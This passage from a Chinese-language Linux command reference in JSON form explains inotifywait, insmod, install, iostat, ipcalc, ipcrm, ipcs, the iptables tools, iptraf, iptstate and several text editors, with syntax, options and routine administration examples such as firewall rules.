可以用来收集有关文件访问信息，Linux发行版一般没有包括这个命令，需要安装inotify-tools，这个命令还需要将inotify支持编译入Linux内核，好在大多数Linux发行版都在内核中启用了inotify。\n*    **inotifywatch命令** 用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。\n\n开始之前需要检测系统内核是否支持inotify：\n\n使用`uname -r`命令检查Linux内核，如果低于2.6.13，就需要重新编译内核加入inotify的支持。\n\n使用`ll /proc/sys/fs/inotify`命令，是否有以下三条信息输出，如果没有表示不支持。\n\n```\nll /proc/sys/fs/inotify\ntotal 0\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_queued_events\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_user_instances\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_user_watches\n\n```\n\n### 安装inotify-tools  \n\n*   inotify-tools项目地址：https://github.com/rvoicilas/inotify-tools\n*   inotify-tools下载地址：http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz\n\n```\n#CentOS release 5.8/64位：\ntar zxvf inotify-tools-3.14.tar.gz\ncd inotify-tools-3.14\n./configure\nmake\nmake install\n```\n\n其他Linux发行版安装方法可以参见：https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting\n\n### inotify相关参数  \n\ninotify定义了下列的接口参数，可以用来限制inotify消耗kernel memory的大小。由于这些参数都是内存参数，因此，可以根据应用需求，实时的调节其大小：\n\n*   `/proc/sys/fs/inotify/max_queued_evnets`表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。\n*   `/proc/sys/fs/inotify/max_user_instances`表示每一个real user id可创建的inotify instatnces的数量上限。\n*   `/proc/sys/fs/inotify/max_user_watches`表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。\n\n根据以上在32位或者64位系统都可以执行：\n\n```\necho 104857600 \u003e /proc/sys/fs/inotify/max_user_watches\necho \u0027echo 104857600 \u003e /proc/sys/fs/inotify/max_user_watches\u0027 \u003e\u003e /etc/rc.local\n```\n\n如果遇到以下错误：\n\n```\ninotifywait: error while loading shared libraries: libinotifytools.so.0: cannot open shared object file: No such file or directory \n```\n\n```\n **解决方法：** \n32位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib/libinotifytools.so.0\n64位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib64/libinotifytools.so.0\n```\n\n### inotifywait命令使用  \n\n```\n#!/bin/bash\n#filename watchdir.sh\npath\u003d$1\n/usr/local/bin/inotifywait -mrq --timefmt \u0027%d/%m/%y/%H:%M\u0027 --format \u0027%T %w %f\u0027 -e modify,delete,create,attrib $path\n\n执行输出：\n./watchdir.sh /data/wsdata/tools/\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp~\n04/01/13/16:35 /data/wsdata/tools/ .j.jsp.swp\n\n```\n\n### inotifywait命令参数  \n\n*   `-m`是要持续监视变化。\n*   `-r`使用递归形式监视目录。\n*   `-q`减少冗余信息，只打印出需要的信息。\n*   `-e`指定要监视的事件列表。\n*   `--timefmt`是指定时间的输出格式。\n*   `--format`指定文件变化的详细信息。\n\n#### 可监听的事件  \n\n\u003ctable border\u003d\"0\" height\u003d\"193\" style\u003d\"width: 100%;\" width\u003d\"74\"\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e事件\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eaccess\u003c/td\u003e\n\n\u003ctd\u003e **访问** ，读取文件。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003emodify\u003c/td\u003e\n\n\u003ctd\u003e **修改** ，文件内容被修改。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eattrib\u003c/td\u003e\n\n\u003ctd\u003e **属性** ，文件元数据被修改。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003emove\u003c/td\u003e\n\n\u003ctd\u003e **移动** ，对文件进行移动操作。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ecreate\u003c/td\u003e\n\n\u003ctd\u003e **创建** ，生成新文件\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eopen\u003c/td\u003e\n\n\u003ctd\u003e **打开** ，对文件进行打开操作。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eclose\u003c/td\u003e\n\n\u003ctd\u003e **关闭** ，对文件进行关闭操作。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003edelete\u003c/td\u003e\n\n\u003ctd\u003e **删除** ，文件被删除。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n\n"},{"name":"insmod","categoryId":4,"data":"insmod\n\u003d\u003d\u003d\n\n将给定的模块加载到内核中\n\n## 补充说明\n\n**insmod命令** 用于将给定的模块加载到内核中。Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。\n\n### 语法  \n\n```\ninsmod(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：不检查目前kernel版本与模块编译时的kernel版本是否一致，强制将模块载入；\n-k：将模块设置为自动卸除；\n-m：输出模块的载入信息；\n-o\u003c模块名称\u003e：指定模块的名称，可使用模块文件的文件名；\n-p：测试模块是否能正确地载入kernel；\n-s：将所有信息记录在系统记录文件中；\n-v：执行时显示详细的信息；\n-x：不要汇出模块的外部符号；\n-X：汇出模块所有的外部符号，此为预设置。\n```\n\n### 参数  \n\n内核模块：指定要加载的内核模块文件。\n\n### 实例  \n\n加载RAID1阵列级别模块，如下所示：\n\n```\n[root@localhost boot]# insmod /lib/modules/2.6.\n18-8.el5/kernel/drivers/md/raid1.ko  \n\n[root@localhost boot]# lsmod | grep raid1\nraid1                  25153  0\n```\n\n从以上显示结果可知，RAID1模块已加载成功。只是在使用insmod命令加载模块时，需要使用绝对路径方能加载，且加载时无法自动解决依赖关系。\n\n\n"},{"name":"install","categoryId":0,"data":"install\n\u003d\u003d\u003d\n\n安装或升级软件或备份数据\n\n## 补充说明\n\n**install命令** 的作用是安装或升级软件或备份数据，它的使用权限是所有用户。install命令和cp命令类似，都可以将文件/目录拷贝到指定的地点。但是，install允许你控制目标文件的属性。install通常用于程序的makefile，使用它来将程序拷贝到目标（安装）目录。\n\n### 语法  \n\n```\ninstall [OPTION]... [-T] SOURCE DEST\ninstall [OPTION]... SOURCE... DIRECTORY\ninstall [OPTION]... -t DIRECTORY SOURCE...\ninstall [OPTION]... -d DIRECTORY...\n```\n\n在前两种格式中，会将\u003c来源\u003e复制至\u003c目的地\u003e或将多个\u003c来源\u003e文件复制至已存在的\u003c目录\u003e，同时设定权限模式及所有者/所属组。在第三种格式中，会创建所有指定的目录及它们的主目录。长选项必须用的参数在使用短选项时也是必须的。\n\n### 选项  \n\n```\n--backup[\u003dCONTROL]：为每个已存在的目的地文件进行备份。\n-b：类似 --backup，但不接受任何参数。\n-c：(此选项不作处理)。\n-d，--directory：所有参数都作为目录处理，而且会创建指定目录的所有主目录。\n-D：创建\u003c目的地\u003e前的所有主目录，然后将\u003c来源\u003e复制至 \u003c目的地\u003e；在第一种使用格式中有用。\n-g，--group\u003d组：自行设定所属组，而不是进程目前的所属组。\n-m，--mode\u003d模式：自行设定权限模式 (像chmod)，而不是rwxr-xr-x。\n-o，--owner\u003d所有者：自行设定所有者 (只适用于超级用户)。\n-p，--preserve-timestamps：以\u003c来源\u003e文件的访问/修改时间作为相应的目的地文件的时间属性。\n-s，--strip：用strip命令删除symbol table，只适用于第一及第二种使用格式。\n-S，--suffix\u003d后缀：自行指定备份文件的\u003c后缀\u003e。\n-v，--verbose：处理每个文件/目录时印出名称。\n--help：显示此帮助信息并离开。\n--version：显示版本信息并离开。\n```\n\n### 实例  \n\n```\ninstall -d [option] DIRECTORY [DIRECTORY...]\n```\n\n支持多个，类似`mkdir -p`支持递归。例如：`install -d a/b/c e/f`结果和`mkdir -p a/b/c e/f`一样。\n\n```\ninstall [option] SOURCE DEST\n```\n\n **复制SOURCE文件（测试不能是目录）到DEST file（文件）：** \n\n```\ninstall a/e c\n结果类似：\ncp a/e c    #注意c必须是文件。\n```\n\n **有用选项`-D`：** \n\n```\ninstall -D x a/b/c\n效果类似：\nmkdir -p a/b \u0026\u0026 cp x a/b/c\n```\n\n```\ninstall [option] SOURCE [SOURCE...] DIRECTORY\n```\n\n **复制多个SOURCE文件到目的目录：** \n\n```\ninstall a/* d\n```\n\n其中d是目录。\n\n\n"},{"name":"iostat","categoryId":0,"data":"iostat\n\u003d\u003d\u003d\n\n监视系统输入输出设备和CPU的使用情况\n\n## 补充说明\n\n**iostat命令** 被用于监视系统输入输出设备和CPU的使用情况。它的特点是汇报磁盘活动统计情况，同时也会汇报出CPU使用情况。同vmstat一样，iostat也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。\n\n### 语法  \n\n```\niostat(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：仅显示CPU使用情况；\n-d：仅显示设备利用率；\n-k：显示状态以千字节每秒为单位，而不使用块每秒；\n-m：显示状态以兆字节每秒为单位；\n-p：仅显示块设备和所有被使用的其他分区的状态；\n-t：显示每个报告产生时的时间；\n-V：显示版号并退出；\n-x：显示扩展状态。\n```\n\n### 参数  \n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n### 实例  \n\n用`iostat -x /dev/sda1`来观看磁盘I/O的详细情况：\n\n```\niostat -x /dev/sda1 \nLinux 2.6.18-164.el5xen (localhost.localdomain)\n2010年03月26日  \n\navg-cpu:  %user   %nice %system %iowait \n%steal   %idle  \n            0.11    0.02    0.18    0.35   \n0.03    99.31  \n\nDevice:         tps   Blk_read/s    Blk_wrtn/s  \nBlk_read   Blk_wrtn  \nsda1                0.02          0.08       \n0.00          2014               4 \n```\n\n详细说明：第二行是系统信息和监测时间，第三行和第四行显示CPU使用情况（具体内容和mpstat命令相同）。这里主要关注后面I/O输出的信息，如下所示：\n\n\u003ctable\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e标示\u003c/th\u003e\n\n\u003cth\u003e说明\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eDevice\u003c/td\u003e\n\n\u003ctd\u003e监测设备名称\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003errqm/s\u003c/td\u003e\n\n\u003ctd\u003e每秒需要读取需求的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ewrqm/s\u003c/td\u003e\n\n\u003ctd\u003e每秒需要写入需求的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003er/s \u003c/td\u003e\n\n\u003ctd\u003e每秒实际读取需求的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ew/s\u003c/td\u003e\n\n\u003ctd\u003e每秒实际写入需求的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ersec/s\u003c/td\u003e\n\n\u003ctd\u003e每秒读取区段的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ewsec/s\u003c/td\u003e\n\n\u003ctd\u003e每秒写入区段的数量\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003erkB/s\u003c/td\u003e\n\n\u003ctd\u003e每秒实际读取的大小，单位为KB\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ewkB/s\u003c/td\u003e\n\n\u003ctd\u003e每秒实际写入的大小，单位为KB\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eavgrq-sz\u003c/td\u003e\n\n\u003ctd\u003e需求的平均大小区段\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eavgqu-sz\u003c/td\u003e\n\n\u003ctd\u003e需求的平均队列长度\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eawait\u003c/td\u003e\n\n\u003ctd\u003e等待I/O平均的时间（milliseconds）\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esvctm\u003c/td\u003e\n\n\u003ctd\u003eI/O需求完成的平均时间\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%util\u003c/td\u003e\n\n\u003ctd\u003e被I/O需求消耗的CPU百分比\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n\n"},{"name":"ipcalc","categoryId":0,"data":"ipcalc\n\u003d\u003d\u003d\n\n简单的IP地址计算器\n\n## 补充说明\n\n**ipcalc命令** 是一个简单的ip地址计算器，可以完成简单的IP地址计算任务。\n\n### 语法  \n\n```\nipcalc(选项)\n```\n\n### 选项  \n\n```\n-b：由给定的IP地址和网络掩码计算出广播地址；\n-h：显示给定UP地址所对应的主机名；\n-m：由给定的IP地址计算器网络掩码；\n-p：显示给定的掩码或IP地址的前缀；\n-n：由给定的IP地址和网络掩码计算网络地址；\n-s：安静模式；\n--help：显示帮助信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# ipcalc -p 192.168.2.1 255.255.255.0\nPREFIX\u003d24\n\n[root@localhost ~]# ipcalc -n 192.168.2.1 255.255.255.0\nNETWORK\u003d192.168.2.0\n\n[root@localhost ~]# ipcalc -h 127.0.0.1\nhostname\u003dlocalhost.localdomain\n\n[root@localhost ~]# ipcalc -m 192.168.2.1\nNETMASK\u003d255.255.255.0\n\n[root@localhost ~]# ipcalc -pnbm 192.168.2.1 255.255.255.0\nNETMASK\u003d255.255.255.0\nPREFIX\u003d24\nBROADCAST\u003d192.168.2.255\nNETWORK\u003d192.168.2.0\n```\n\n\n"},{"name":"ipcrm","categoryId":0,"data":"ipcrm\n\u003d\u003d\u003d\n\n删除消息队列、信号集、或者共享内存标识\n\n## 补充说明\n\n**ipcrm命令** 用来删除一个或更多的消息队列、信号量集或者共享内存标识。\n\n### 语法  \n\n```\nipcrm [ -m SharedMemoryID ] [ -M SharedMemoryKey ] [ -q MessageID ] [ -Q MessageKey ] [ -s SemaphoreID ] [ -S SemaphoreKey ]\n```\n\n### 选项  \n\n```\n-m SharedMemory id 删除共享内存标识 SharedMemoryID。与 SharedMemoryID 有关联的共享内存段以及数据结构都会在最后一次拆离操作后删除。\n-M SharedMemoryKey 删除用关键字 SharedMemoryKey 创建的共享内存标识。与其相关的共享内存段和数据结构段都将在最后一次拆离操作后删除。\n-q MessageID 删除消息队列标识 MessageID 和与其相关的消息队列和数据结构。\n-Q MessageKey 删除由关键字 MessageKey 创建的消息队列标识和与其相关的消息队列和数据结构。\n-s SemaphoreID 删除信号量标识 SemaphoreID 和与其相关的信号量集及数据结构。\n-S SemaphoreKey 删除由关键字 SemaphoreKey 创建的信号标识和与其相关的信号量集和数据结构。\n```\n\nmsgctl、shmctl 和 semctl 子例程提供了删除操作的细节。标识和关键字可以用 ipcs 命令找到。\n\n### 示例  \n\n如果要删除和 SharedMemoryID 18602 相关的共享内存段，请输入：\n\n```\nipcrm -m 18602\n```\n\n\n"},{"name":"ipcs","categoryId":0,"data":"ipcs\n\u003d\u003d\u003d\n\n分析消息队列共享内存和信号量 \n\n## 补充说明\n\n**ipcs命令** 用于报告Linux中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。\n\n### 语法  \n\n```\nipcs(选项)\n```\n\n### 选项  \n\n```\n-a：显示全部可显示的信息；\n-q：显示活动的消息队列信息；\n-m：显示活动的共享内存信息；\n-s：显示活动的信号量信息。\n```\n\n### 实例  \n\n```\nipcs -a\n------ Shared Memory Segments --------\nkey        shmid      owner      perms      bytes      nattch     status      \n0x7401833d 2654208    root      600        4          0                       \n0x00000000 3145729    root      600        4194304    9          dest         \n0x7401833c 2621442    root      600        4          0                       \n0xd201012b 3080195    root      600        1720       2\n```\n\n\n"},{"name":"iptables","categoryId":0,"data":"iptables\n\u003d\u003d\u003d\n\nLinux上常用的防火墙软件\n\n## 补充说明\n\n**iptables命令** 是Linux上常用的防火墙软件，是netfilter项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。\n\n### 语法  \n\n```\niptables(选项)(参数)\n```\n\n### 选项  \n\n```\n-t\u003c表\u003e：指定要操纵的表；\n-A：向规则链中添加条目；\n-D：从规则链中删除条目；\n-i：向规则链中插入条目；\n-R：替换规则链中的条目；\n-L：显示规则链中已有的条目；\n-F：清楚规则链中已有的条目；\n-Z：清空规则链中的数据包计算器和字节计数器；\n-N：创建新的用户自定义规则链；\n-P：定义规则链中的默认目标；\n-h：显示帮助信息；\n-p：指定要匹配的数据包协议类型；\n-s：指定要匹配的数据包源ip地址；\n-j\u003c目标\u003e：指定要跳转的目标；\n-i\u003c网络接口\u003e：指定数据包进入本机的网络接口；\n-o\u003c网络接口\u003e：指定数据包要离开本机所使用的网络接口。\n```\n\n **iptables命令选项输入顺序：** \n\n```\niptables -t 表名 \u003c-A/I/D/R\u003e 规则链名 [规则号] \u003c-i/o 网卡名\u003e -p 协议名 \u003c-s 源IP/源子网\u003e --sport 源端口 \u003c-d 目标IP/目标子网\u003e --dport 目标端口 -j 动作\n```\n\n表名包括：\n\n*    **raw** ：高级功能，如：网址过滤。\n*    **mangle** ：数据包修改（QOS），用于实现服务质量。\n*    **net** ：地址转换，用于网关路由器。\n*    **filter** ：包过滤，用于防火墙规则。\n\n规则链名包括：\n\n*    **INPUT链** ：处理输入数据包。\n*    **OUTPUT链** ：处理输出数据包。\n*    **PORWARD链** ：处理转发数据包。\n*    **PREROUTING链** ：用于目标地址转换（DNAT）。\n*    **POSTOUTING链** ：用于源地址转换（SNAT）。\n\n动作包括：\n\n*    **accept** ：接收数据包。\n*    **DROP** ：丢弃数据包。\n*    **REDIRECT** ：重定向、映射、透明代理。\n*    **SNAT** ：源地址转换。\n*    **DNAT** ：目标地址转换。\n*    **MASQUERADE** ：IP伪装（NAT），用于ADSL。\n*    **LOG** ：日志记录。\n\n### 实例  \n\n **清除已有iptables规则** \n\n```\niptables -F\niptables -X\niptables -Z\n```\n\n **开放指定的端口** \n\n```\niptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT               #允许本地回环接口(即运行本机访问本机)\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT    #允许已建立的或相关连的通行\niptables -A OUTPUT -j ACCEPT         #允许所有本机向外的访问\niptables -A INPUT -p tcp --dport 22 -j ACCEPT    #允许访问22端口\niptables -A INPUT -p tcp --dport 80 -j ACCEPT    #允许访问80端口\niptables -A INPUT -p tcp --dport 21 -j ACCEPT    #允许ftp服务的21端口\niptables -A INPUT -p tcp --dport 20 -j ACCEPT    #允许FTP服务的20端口\niptables -A INPUT -j reject       #禁止其他未允许的规则访问\niptables -A FORWARD -j REJECT     #禁止其他未允许的规则访问\n```\n\n **屏蔽IP** \n\n```\niptables -I INPUT -s 123.45.6.7 -j DROP       #屏蔽单个IP的命令\niptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254的命令\niptables -I INPUT -s 124.45.0.0/16 -j DROP    #封IP段即从123.45.0.1到123.45.255.254的命令\niptables -I INPUT -s 123.45.6.0/24 -j DROP    #封IP段即从123.45.6.1到123.45.6.254的命令是\n```\n\n **查看已添加的iptables规则** \n\n```\niptables -L -n -v\nChain INPUT (policy DROP 48106 packets, 2690K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 5075  589K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           \n 191K   90M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:22\n1499K  133M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:80\n4364K 6351M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED\n 6256  327K ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0           \n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain OUTPUT (policy ACCEPT 3382K packets, 1819M bytes)\n pkts bytes target     prot opt in     out     source               destination         \n 5075  589K ACCEPT     all  --  *      lo      0.0.0.0/0            0.0.0.0/0  \n```\n\n **删除已添加的iptables规则** \n\n将所有iptables以序号标记显示，执行：\n\n```\niptables -L -n --line-numbers\n```\n\n比如要删除INPUT里序号为8的规则，执行：\n\n```\niptables -D INPUT 8\n```\n\n\n"},{"name":"iptables-save","categoryId":0,"data":"iptables-save\n\u003d\u003d\u003d\n\n备份iptables的表配置\n\n## 补充说明\n\n**iptables-save命令** 用于将linux内核中的iptables表导出到标准输出设备商，通常，使用shell中I/O重定向功能将其输出保存到指定文件中。\n\n### 语法  \n\n```\niptables-save(选项)\n```\n\n### 选项  \n\n```\n-c：指定要保存的iptables表时，保存当权的数据包计算器和字节计数器的值；\n-t：指定要保存的表的名称。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# iptables-save -t filter \u003e iptables.bak\n[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n:INPUT DROP [48113:2690676]\n:FORWARD accept [0:0]\n:OUTPUT ACCEPT [3381959:1818595115]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n```\n\n\n"},{"name":"iptraf","categoryId":0,"data":"iptraf\n\u003d\u003d\u003d\n\n实时地监视网卡流量\n\n## 补充说明\n\n**iptraf命令** 可以实时地监视网卡流量，可以生成网络协议数据包信息、以太网信息、网络节点状态和ip校验和错误等信息。\n\n### 语法  \n\n```\niptraf(选项)\n```\n\n### 选项  \n\n```\n-i网络接口：立即在指定网络接口上开启IP流量监视；\n-g：立即开始生成网络接口的概要状态信息；\n-d网络接口：在指定网络接口上立即开始监视明细的网络流量信息；\n-s网络接口：在指定网络接口上立即开始监视TCP和UDP网络流量信息；\n-z网络接口：在指定网络接口上显示包计数；\n-l网络接口：在指定网络接口上立即开始监视局域网工作站信息；\n-t时间：指定iptraf指令监视的时间；\n-B；将标注输出重新定向到“/dev/null”，关闭标注输入，将程序作为后台进程运行；\n-f：清空所有计数器；\n-h：显示帮助信息。\n```\n\n\n"},{"name":"iptstate","categoryId":0,"data":"iptstate\n\u003d\u003d\u003d\n\n显示iptables的工作状态\n\n## 补充说明\n\n**iptstate命令** 以top指令类似的风格时显示Linux内核中iptables的工作状态。\n\n### 语法  \n\n```\niptstate(选项)\n```\n\n### 选项  \n\n```\n-b：指定输出信息的排序规则；\n-d：不动态地改变窗口大小；\n-f：过滤本地回送信息；\n-l：将ip地址解析为域名；\n-L：隐藏于DNS查询相关状态；\n-r：指定刷新屏幕的频率；\n-R：反序排列；\n-s：单次运行模式；\n-t：显示汇总信息。\n```\n\n\n"},{"name":"ispell","categoryId":1,"data":"ispell\n\u003d\u003d\u003d\n\n检查文件中出现的拼写错误\n\n## 补充说明\n\n**ispell命令** 用于检查文件中出现的拼写错误。\n\n### 语法  \n\n```\nispell(参数)\n```\n\n### 参数  \n\n文件：指定要进行拼写检查的文件。\n\n\n"},{"name":"jed","categoryId":1,"data":"jed\n\u003d\u003d\u003d\n\n主要用于编辑代码的编辑器\n\n## 补充说明\n\n**jed命令** 是由Slang所开发，其主要用用途是编辑程序的源代码。它支持彩色语法加亮显示，可以模拟emacs，EDT，wordstar和Brief编辑器。\n\n### 语法  \n\n```\njed(选项)(参数)\n```\n\n### 选项  \n\n```\n-2：显示上下两个编辑区；\n-batch：以批处理模式来执行；\n-f\u003c函数\u003e：执行Slang函数；\n-g\u003c行数\u003e：移到缓冲区中指定的行数；\n-i\u003c文件\u003e：将指定的文件载入缓冲区；\n-n：不要载入jed.rc配置文件；\n-s\u003c字符串\u003e：查找并移到指定的字符串。\n```\n\n### 参数  \n\n文件：指定待编辑的文件列表。\n\n### 实例  \n\n以上下两个编辑区的方式，开启 mysource.c 原始代码文件。若要切换编辑区，可利用稍后介绍的命令，开启操作命令，开启功能表后，按 3 ，再按 2 ，即可切换编辑区：\n\n```\njed -2 mysource.c\n```\n\n **操作** \n\n有些Emacs的组合键和jed菜单组合键冲突例如Alt+f在Emacs中应该是“前进一个单词”，而在jed中则是“文件菜单” 想使用Emacs风格的组合键的话，编辑`/usr/share/jed/lib/menus.slc`找到如下段落：\n\n```\nunsetsetkey (\"selectmenubar\", \"\\em\");\nunsetsetkey (\"@\\emF\", \"\\ef\");\nunsetsetkey (\"@\\emE\", \"\\ee\");\nunsetsetkey (\"@\\emo\", \"\\eo\");\n% Mode menu unsetsetkey (\"@\\emS\", \"\\es\");\nunsetsetkey (\"@\\emB\", \"\\eb\");\nunsetsetkey (\"@\\emi\", \"\\ei\");\nunsetsetkey (\"@\\emH\", \"\\eh\");\nunset_setkey (\"@\\emy\", \"\\ey\");\n```\n\n可以根据自己的需要修改，也可以简单的注释掉；使用菜单可以用F10键。\n\n由于Jed可模拟多种编辑器，其各自按键指令也有所不同。这里以模拟 Emacs 为例，说明在编辑器中的操作方法。\n\n **文件** \n\n```\n/usr/share/jed/lib/*.sl 这是默认的运行jed slang的文件。\n/usr/share/jed/lib/site.sl 这是默认的启动文件。\n/etc/jed.rc 这是全局系统配置文件。\n~/.jedrc 这是用户配置文件。\n```\n\n\n"},{"name":"joe","categoryId":1,"data":"joe\n\u003d\u003d\u003d\n\n强大的纯文本编辑器\n\n## 补充说明\n\n**joe命令** 是一款功能强大的纯文本编辑器，拥有众多编写程序和文本的优良特性。\n\n### 语法  \n\n```\njoe(选项)(参数)\n```\n\n### 选项  \n\n```\n-force：强制在最后一行的结尾处加上换行符号；\n-lines\u003c行数\u003e：设置行数；\n-lightoff：选取的区块在执行完区块命令后，就会恢复成原来的状态；\n-autoindent：自动缩排；\n-backpath：\u003c目录\u003e：指定备份文件的目录；\n-beep：编辑时，若有错误即发出哔声；\n-columns\u003c栏位\u003e：设置栏数；\n-csmode：可执行连续查找模式；\n-dopadding：是程序跟tty间存在缓冲区；\n-exask：在程序中，执行“Ctrl+k+x”时，会先确认是否要保存文件；\n-force：强制在最后一行的结尾处加上换行符号；\n-help：执行程序时一并显示帮助；\n-keepup：在进入程序后，画面上方为状态列；\n-marking：在选取区块时，反白区块会随着光标移动；\n-mid：当光标移出画面时，即自动卷页，使光标回到中央；\n-nobackups：不建立备份文件；\n-nonotice：程序执行时，不显示版本信息；\n-nosta：程序执行时，不显示状态列；\n-noxon：尝试取消“Ctrl+s”和“Ctrl+q”键的功能；\n-orphan：若同时开启一个以上的文件，则其他文件会置于独立的缓冲区，而不会另外开启编辑区；\n-pg\u003c行数\u003e：按“PageUp”或“PageDown”换页时，所要保留前一页的行数；\n-skiptop\u003c行数\u003e：不使用屏幕上方指定的行数。\n```\n\n### 参数  \n\n文件：指定要编辑的文件。\n\n\n"},{"name":"join","categoryId":1,"data":"join\n\u003d\u003d\u003d\n\n两个文件中指定栏位内容相同的行连接起来\n\n## 补充说明\n\n**join命令** 用来将两个文件中，制定栏位内容相同的行连接起来。找出两个文件中，指定栏位内容相同的行，并加以合并，再输出到标准输出设备。\n\n### 语法  \n\n```\njoin(选项)(参数)\n```\n\n### 选项  